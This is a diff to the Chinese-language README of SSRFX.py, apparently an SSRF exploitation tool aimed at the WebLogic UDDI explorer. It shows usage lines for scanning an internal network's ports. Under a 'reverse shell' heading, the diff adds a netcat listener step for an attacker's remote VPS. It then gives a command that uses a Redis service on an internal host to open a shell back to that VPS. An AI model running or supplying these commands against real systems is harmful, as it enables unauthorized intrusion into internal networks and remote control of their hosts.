@@ -29,6 +29,12 @@ python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp
 python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172.16.5.0/24 --type portscan
 ```
 # 反弹shell
+
+> 远程VPS
+```
+nc -lvp 监听端口
+```
+> 跳板主机
 ```
 python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --vulapp redis --type getshell --lhost 内网主机 --lport redis端口 --rhost 远程主机 --rport 监听端口
 ```
